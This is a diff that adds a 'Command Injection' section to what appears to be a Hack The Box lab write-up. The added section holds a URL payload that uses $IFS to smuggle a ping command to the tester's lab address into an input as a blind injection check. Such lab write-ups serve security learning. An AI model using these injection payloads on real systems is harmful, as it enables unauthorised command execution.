@@ -262,4 +262,9 @@ Connection: Keep-Alive
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a1fec5ed-4eb7-477a-bb39-a87b8f3b253e)
 ![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/b2a4b8fa-5f7e-454e-82ea-0133dd3ff0ef)
 
+Command Injection
+```shell
+http://10.10.14.10/$(ping$IFS-c$IFS'1'$IFS'10.10.14.10')
+```
+![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/59423275-cbfb-4e12-bd39-4d2378df9249)
 
